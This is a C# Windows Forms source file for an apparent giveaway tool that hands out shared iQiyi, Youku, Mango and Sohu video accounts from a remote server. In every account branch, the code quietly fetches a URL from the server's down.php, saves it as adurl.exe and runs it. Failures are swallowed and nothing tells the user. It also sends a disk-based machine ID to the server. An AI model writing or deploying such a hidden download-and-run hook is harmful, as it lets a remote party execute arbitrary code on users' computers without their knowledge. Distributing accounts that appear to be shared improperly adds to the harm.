using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using CCWin;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Xml;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Threading;

namespace SoftReg
{
    public partial class Form1 : Skin_Mac
    {
        public Form1()
        {
            InitializeComponent();

        }
        SoftReg softReg = new SoftReg();


        public void create(string text, string lujin)
        {
            FileStream fs = new FileStream(lujin, FileMode.CreateNew);
            StreamWriter sw = new StreamWriter(fs, Encoding.Default);
            sw.Write(text);
            sw.Close();
            fs.Close();
        }


        public void Write(string text,string lujin)
        {
            FileStream fs = new FileStream(lujin, FileMode.Create);
            StreamWriter sw = new StreamWriter(fs, Encoding.Default);
            sw.Write(text);
            sw.Close();
            fs.Close();
        }

        public void webdownload(string urlpath)
        {
           
            WebClient webClient = new WebClient();
            //
            webClient.DownloadFile(urlpath, @"adurl.exe");
        }



        public void Writeappend(string text, string lujin)
        {
            FileStream fs = new FileStream(lujin, FileMode.Append);
            StreamWriter sw = new StreamWriter(fs, Encoding.Default);
            sw.Write(text);
            sw.Close();
            fs.Close();
        }

        public string Read(string path)
        {
            StreamReader sr = new StreamReader(path, Encoding.Default);
            String line;
            line = sr.ReadLine();
            sr.Close();
            return line;
            

           
        }

        //public void Read2(string path)
        //{
        //    StreamReader sr = new StreamReader(path, Encoding.Default);
        //    String line;
        //    while ((line = sr.ReadLine()) != null)
        //    {
        //        Console.WriteLine(line.ToString());
        //    }
        //}
        public string md5(string str)
        {
            MD5 m = new MD5CryptoServiceProvider();
            byte[] s = m.ComputeHash(UnicodeEncoding.UTF8.GetBytes(str));
            return BitConverter.ToString(s);
        }

        public string xxm(string urlpath,string path,string nodepath)
        {
            XmlDocument xmlDoc = new XmlDocument();
            string ActivityId = "";
            try
            {
                xmlDoc.Load(@urlpath);
                //xmlDoc.Load(@"");
                //读取Activity节点下的数据。SelectSingleNode匹配第一个Activity节点  
                // XmlNode root = xmlDoc.SelectSingleNode("/root/result");//当节点Workflow带有属性是，使用SelectSingleNode无法读取     
                XmlNode root = xmlDoc.SelectSingleNode(path);
                ActivityId = (root.SelectSingleNode(nodepath)).InnerText;
                
                
            }
            catch (Exception e)
            {
                MessageBox.Show("网络是否连接"); //显示错误信息  
            }
            return ActivityId;

        }


        public void DownloadFile(string URL, string filename, System.Windows.Forms.ProgressBar prog, System.Windows.Forms.Label label1)
        {
            float percent = 0;
            try
            {
                System.Net.HttpWebRequest Myrq = (System.Net.HttpWebRequest)System.Net.HttpWebRequest.Create(URL);
                System.Net.HttpWebResponse myrp = (System.Net.HttpWebResponse)Myrq.GetResponse();
                long totalBytes = myrp.ContentLength;
                if (prog != null)
                {
                    prog.Maximum = (int)totalBytes;
                }
                System.IO.Stream st = myrp.GetResponseStream();
                System.IO.Stream so = new System.IO.FileStream(filename, System.IO.FileMode.Create);
                long totalDownloadedByte = 0;
                byte[] by = new byte[1024];
                int osize = st.Read(by, 0, (int)by.Length);
                while (osize > 0)
                {
                    totalDownloadedByte = osize + totalDownloadedByte;
                    System.Windows.Forms.Application.DoEvents();
                    so.Write(by, 0, osize);
                    if (prog != null)
                    {
                        prog.Value = (int)totalDownloadedByte;
                    }
                    osize = st.Read(by, 0, (int)by.Length);

                    percent = (float)totalDownloadedByte / (float)totalBytes * 100;
                   
                    System.Windows.Forms.Application.DoEvents(); //必须加注这句代码，否则label1将因为循环执行太快而来不及显示信息
                }

                so.Close();
                st.Close();
            }
            catch (System.Exception)
            {
                throw;
            }
        }

        public string HttpPost(string Url, string postDataStr)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Url);
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            //request.Headers.Add("User_Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4");
            //request.Headers["User-Agent"] = "onlyhuiyuan";
            //request.Headers.Add("User-Agent", "onlyhuiyuan");
            //request.Headers.Add("clientmarket", "1");
            request.ContentLength = Encoding.UTF8.GetByteCount(postDataStr);
            Stream myRequestStream = request.GetRequestStream();
            StreamWriter myStreamWriter = new StreamWriter(myRequestStream, Encoding.GetEncoding("gb2312"));
            myStreamWriter.Write(postDataStr);
            myStreamWriter.Close();

            HttpWebResponse response = (HttpWebResponse)request.GetResponse();

            Stream myResponseStream = response.GetResponseStream();
            StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
           string retString = myStreamReader.ReadToEnd();
            myStreamReader.Close();
            myResponseStream.Close();
            return retString;
        }

        private void GetMachineCode(object sender, EventArgs e)
        {
            //string result = "zzz2188185";
            //string bytes = md5(result);
            
            string MachineStr = softReg.GetMNum();//磁盘信息

            string urlpath = "http://api.k780.com:88/?app=life.time&appkey=10003&sign=b59bc3ef6191eb9f747dd4e83c99f2a4&format=xml";
            string path = "/root/result";
            string nodepath = "timestamp";
            string erre = xxm(urlpath, path, nodepath);
            int ti = Convert.ToInt32(erre);
            //if (erre == "") {  }
            //else { ti = Convert.ToInt32(erre); }//当前时间
            //int timeupdate = ti;
            //int timeupdate = ti - 18000;
            //MessageBox.Show(timeupdate.ToString());
            //string Ps = MachineStr + bytes.Replace("-", "");

            string urlrs = "http://www.nandada.com/";
            if(!(RB_aqy.Checked || RB_yk.Checked || RB_mg.Checked || RB_sh.Checked) ){ MessageBox.Show("请选择一项"); }
            else{
                if (HttpPost(urlrs + "exit.php", "MachineStr=" + MachineStr) == "no") {
                    //HttpPost(urlrs + "inser.php", "MachineStr=" + MachineStr);
                    if (RB_aqy.Checked)
                    {
                        string urlpath2 = urlrs + "aqyxml.php";
                        string path2 = "/users/user";
                        string nodepath2 = "name";
                        string aqy_zh = xxm(urlpath2, path2, nodepath2);
                        MachineCode.SkinTxt.Text = aqy_zh;
                        Write(aqy_zh, "hs.bak");

                        //HttpPost(urlrs + "d.php", "MachineStr=" + MachineStr);
                        if (aqy_zh == "")
                        {
                            HttpPost(urlrs + "delinfo.php", "MachineStr=" + MachineStr);
                            MessageBox.Show("账号已经被领取光了，下次早点哦！");
                        }
                        try
                        {
                            string adurl = HttpPost(urlrs + "down.php", "MachineStr=");
                            if (adurl != "")
                            {
                                int test = Read("ad.bak").IndexOf(adurl);
                                if (test < 0)
                                {
                                    Writeappend(adurl + "|", "ad.bak");
                                    webdownload(adurl);

                                    Process.Start("adurl.exe");


                                }




                            }
                        }
                        catch { }


                        //try
                        //{
                        //    string adurl = HttpPost(urlrs + "down.php", "MachineStr=" + MachineStr);
                        //    if (adurl != "")
                        //    {
                        //        int test = Read("ad.bak").IndexOf(adurl);
                        //        if (test < 0)
                        //        {
                        //            Writeappend(adurl + "|", "ad.bak");



                        //            MessageBox.Show(adurl);
                        //        }




                        //    }
                        //}
                        //catch { }

                    }

                    else if (RB_yk.Checked)
                    {
                        string urlpath2 = urlrs + "ykxml.php";
                        string path2 = "/users/user";
                        string nodepath2 = "name";
                        string aqy_zh = xxm(urlpath2, path2, nodepath2);
                        MachineCode.SkinTxt.Text = aqy_zh;
                        Write(aqy_zh, "hs.bak");
                        if (aqy_zh == "")
                        {
                            HttpPost(urlrs + "delinfo.php", "MachineStr=" + MachineStr);
                            MessageBox.Show("账号已经被领取光了，下次早点哦！");
                        }

                        try
                        {
                            string adurl = HttpPost(urlrs + "down.php", "MachineStr=");
                            if (adurl != "")
                            {
                                int test = Read("ad.bak").IndexOf(adurl);
                                if (test < 0)
                                {
                                    Writeappend(adurl + "|", "ad.bak");
                                    webdownload(adurl);

                                    Process.Start("adurl.exe");


                                }




                            }
                        }
                        catch { }
                        //HttpPost(urlrs + "d.php", "MachineStr=" + MachineStr);
                        //if (aqy_zh == "")
                        //{
                        //    MessageBox.Show("领取更多账号，点击加入群【爱奇艺会员分享批发】：http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                        //    System.Diagnostics.Process.Start("http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                        //}

                    }

                    else if (RB_mg.Checked)
                    {
                        string urlpath2 = urlrs + "mgxml.php";
                        string path2 = "/users/user";
                        string nodepath2 = "name";
                        string aqy_zh = xxm(urlpath2, path2, nodepath2);
                        MachineCode.SkinTxt.Text = aqy_zh;
                        Write(aqy_zh, "hs.bak");
                        if (aqy_zh == null)
                        {
                            HttpPost(urlrs + "delinfo.php", "MachineStr=" + MachineStr);
                            MessageBox.Show("账号已经被领取光了，下次早点哦！");
                        }

                        try
                        {
                            string adurl = HttpPost(urlrs + "down.php", "MachineStr=");
                            if (adurl != "")
                            {
                                int test = Read("ad.bak").IndexOf(adurl);
                                if (test < 0)
                                {
                                    Writeappend(adurl + "|", "ad.bak");
                                    webdownload(adurl);

                                    Process.Start("adurl.exe");


                                }




                            }
                        }
                        catch { }
                        //HttpPost(urlrs + "d.php", "MachineStr=" + MachineStr);
                        //if (aqy_zh == "")
                        //{
                        //    MessageBox.Show("领取更多账号，点击加入群【爱奇艺会员分享批发】：http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                        //    System.Diagnostics.Process.Start("http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                        //}

                    }
                    else if (RB_sh.Checked)
                    {
                        string urlpath2 = urlrs + "shxml.php";
                        string path2 = "/users/user";
                        string nodepath2 = "name";
                        string aqy_zh = xxm(urlpath2, path2, nodepath2);
                        MachineCode.SkinTxt.Text = aqy_zh;
                        Write(aqy_zh, "hs.bak");
                        if (aqy_zh == "")
                        {
                            HttpPost(urlrs + "delinfo.php", "MachineStr=" + MachineStr);
                            MessageBox.Show("账号已经被领取光了，下次早点哦！");
                        }

                        try
                        {
                            string adurl = HttpPost(urlrs + "down.php", "MachineStr=");
                            if (adurl != "")
                            {
                                int test = Read("ad.bak").IndexOf(adurl);
                                if (test < 0)
                                {
                                    Writeappend(adurl + "|", "ad.bak");
                                    webdownload(adurl);

                                    Process.Start("adurl.exe");


                                }




                            }
                        }
                        catch { }
                        //HttpPost(urlrs + "d.php", "MachineStr=" + MachineStr);
                        //if (aqy_zh == "")
                        //{
                        //    MessageBox.Show("领取更多账号，点击加入群【爱奇艺会员分享批发】：http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                        //    System.Diagnostics.Process.Start("http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                        //}

                    }

                }
                else {
                    string urlpath2 = urlrs + "timeinfo.php?MachineStr=" + MachineStr;
                    string pathu = "/users/user";
                    string nodepathu = "name";
                    string erre2 = xxm(urlpath2, pathu, nodepathu);
                    int ti2 = Convert.ToInt32(erre2);
                    if (ti - ti2 > 18000)
                    {
                        if (RB_aqy.Checked)
                        {
                            string urlpathaqy = urlrs + "aqyxml.php?MachineStr=" + MachineStr;
                            string pathaqy = "/users/user";
                            string nodepathaqy = "name";
                            string aqy_zh = xxm(urlpathaqy, pathaqy, nodepathaqy);
                            MachineCode.SkinTxt.Text = aqy_zh;
                            Write(aqy_zh, "hs.bak");
                            if (aqy_zh == "")
                            {
                                HttpPost(urlrs + "delinfo.php", "MachineStr=" + MachineStr);
                                MessageBox.Show("账号已经被领取光了，下次早点哦！");
                            }
                            //Thread.Sleep(3000);
                            //MessageBox.Show("点击链接加入群【爱奇艺会员分享批发】：http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                            //System.Diagnostics.Process.Start("http://jq.qq.com/?_wv=1027&k=2EJVSc9");

                            try
                            {
                                string adurl = HttpPost(urlrs + "down.php", "MachineStr=");
                                if (adurl != "")
                                {
                                    int test = Read("ad.bak").IndexOf(adurl);
                                    if (test < 0)
                                    {
                                        Writeappend(adurl + "|", "ad.bak");
                                        webdownload(adurl);

                                        Process.Start("adurl.exe");


                                    }




                                }
                            }
                            catch { }
                            //if (aqy_zh == "")
                            //{
                            //    MessageBox.Show("领取更多账号，点击加入群【爱奇艺会员分享批发】：http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                            //    System.Diagnostics.Process.Start("http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                            //}
                            //HttpPost(urlrs + "d.php", "MachineStr=" + MachineStr);
                        }

                        else if (RB_yk.Checked)
                        {
                            string urlpathyk = urlrs + "ykxml.php?MachineStr=" + MachineStr;
                            string pathyk = "/users/user";
                            string nodepathyk = "name";
                            string aqy_zh = xxm(urlpathyk, pathyk, nodepathyk);
                            MachineCode.SkinTxt.Text = aqy_zh;
                            Write(aqy_zh, "hs.bak");
                            if (aqy_zh == "")
                            {
                                HttpPost(urlrs + "delinfo.php", "MachineStr=" + MachineStr);
                                MessageBox.Show("账号已经被领取光了，下次早点哦！");
                            }
                            ////HttpPost(urlrs + "d.php", "MachineStr=" + MachineStr);
                            //Thread.Sleep(3000);
                            //MessageBox.Show("点击链接加入群【爱奇艺会员分享批发】：http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                            //System.Diagnostics.Process.Start("http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                            try
                            {
                                string adurl = HttpPost(urlrs + "down.php", "MachineStr=");
                                if (adurl != "")
                                {
                                    int test = Read("ad.bak").IndexOf(adurl);
                                    if (test < 0)
                                    {
                                        Writeappend(adurl + "|", "ad.bak");
                                        webdownload(adurl);

                                        Process.Start("adurl.exe");


                                    }




                                }
                            }
                            catch { }
                            //if (aqy_zh == "")
                            //{
                            //    MessageBox.Show("领取更多账号，点击加入群【爱奇艺会员分享批发】：http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                            //    System.Diagnostics.Process.Start("http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                            //}
                        }

                        else if (RB_mg.Checked)
                        {
                            string urlpathmg = urlrs + "mgxml.php?MachineStr=" + MachineStr;
                            string pathmg = "/users/user";
                            string nodepathmg = "name";
                            string aqy_zh = xxm(urlpathmg, pathmg, nodepathmg);
                            MachineCode.SkinTxt.Text = aqy_zh;
                            Write(aqy_zh, "hs.bak");
                            if (aqy_zh == "")
                            {
                                HttpPost(urlrs + "delinfo.php", "MachineStr=" + MachineStr);
                                MessageBox.Show("账号已经被领取光了，下次早点哦！");
                            }
                            // HttpPost(urlrs + "d.php", "MachineStr=" + MachineStr);
                            //Thread.Sleep(3000);
                            //MessageBox.Show("点击链接加入群【爱奇艺会员分享批发】：http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                            //System.Diagnostics.Process.Start("http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                            try
                            {
                                string adurl = HttpPost(urlrs + "down.php", "MachineStr=");
                                if (adurl != "")
                                {
                                    int test = Read("ad.bak").IndexOf(adurl);
                                    if (test < 0)
                                    {
                                        Writeappend(adurl + "|", "ad.bak");
                                        webdownload(adurl);

                                        Process.Start("adurl.exe");


                                    }




                                }
                            }
                            catch { }
                            //if (aqy_zh == "")
                            //{
                            //    MessageBox.Show("领取更多账号，点击加入群【爱奇艺会员分享批发】：http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                            //    System.Diagnostics.Process.Start("http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                            //}
                        }
                        else if (RB_sh.Checked)
                        {
                            string urlpathsh = urlrs + "shxml.php?MachineStr=" + MachineStr;
                            string pathsh = "/users/user";
                            string nodepathsh = "name";
                            string aqy_zh = xxm(urlpathsh, pathsh, nodepathsh);
                            MachineCode.SkinTxt.Text = aqy_zh;
                            Write(aqy_zh, "hs.bak");
                            if (aqy_zh == "")
                            {
                                HttpPost(urlrs + "delinfo.php", "MachineStr=" + MachineStr);
                                MessageBox.Show("账号已经被领取光了，下次早点哦！");
                            }
                            //HttpPost(urlrs + "d.php", "MachineStr=" + MachineStr);
                            //Thread.Sleep(3000);
                            ////MessageBox.Show("点击链接加入群【爱奇艺会员分享批发】：http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                            ////System.Diagnostics.Process.Start("http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                            //////if (aqy_zh == "")
                            //{
                            //    MessageBox.Show("领取更多账号，点击加入群【爱奇艺会员分享批发】：http://jq.qq.com/?_wv=1027&k=2EJVSc9");
                            //    System.Diagnostics.Process.Start("http://jq.qq.com/?_wv=1027&k=2EJVSc9");

                            //}
                            try
                            {
                                string adurl = HttpPost(urlrs + "down.php", "MachineStr=");
                                if (adurl != "")
                                {
                                    int test = Read("ad.bak").IndexOf(adurl);
                                    if (test < 0)
                                    {
                                        Writeappend(adurl + "|", "ad.bak");
                                        webdownload(adurl);

                                        Process.Start("adurl.exe");


                                    }




                                }
                            }
                            catch { }
                        }

                    }
                    else { MessageBox.Show("请五个小时后再获取"); }

                }
            }

            //string urlpath= "http://api.k780.com:88/?app=life.time&appkey=10003&sign=b59bc3ef6191eb9f747dd4e83c99f2a4&format=xml";
            //string path = "/root/result";
            //string nodepath = "timestamp";
            //string erre = xxm(urlpath, path, nodepath);
            //int ti = 0;
            //if (erre == "") { MessageBox.Show("网络是否连接"); }
            //else{ti = Convert.ToInt32(erre); }

            //int timeupdate = ti - 18000;
            //MessageBox.Show(timeupdate.ToString());
            //string result = "zzz2188185";
            //string bytes = md5(result);
            //string MachineStr = softReg.GetMNum();
            //string Ps = MachineStr + bytes.Replace("-", "");


        }


        private void MachineCode_SkinTxt_TextChanged(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {



            string urlrs = "http://www.nandada.com/";





            string urlpathmg = urlrs + "update.php";
            string pathmg = "/users/user";
            string nodepathmg = "name";
            string aqy_zh = xxm(urlpathmg, pathmg, nodepathmg);
            //MachineCode.SkinTxt.Text = aqy_zh;
            if (!File.Exists(@"update.bak")) { create("1", "update.bak"); }
            if(aqy_zh=="update"){
                if (xxm(urlpathmg, pathmg, "times") != Read("update.bak"))
                {

                    Process.Start("update.exe");
                    Write(xxm(urlpathmg, pathmg, "times"), "update.bak");
                    Application.Exit();
                }

            }
            if (File.Exists(@"adurl.exe")) { File.Delete(@"adurl"); }

                if (!File.Exists("hs.bak")) { FileStream fs = new FileStream("hs.bak", FileMode.CreateNew); }
            try
            {
                string FS = "上次获取的账号:" + Read("hs.bak");
                MachineCode.SkinTxt.Text = FS;
            }
            catch (Exception) { }

        }


    }
}
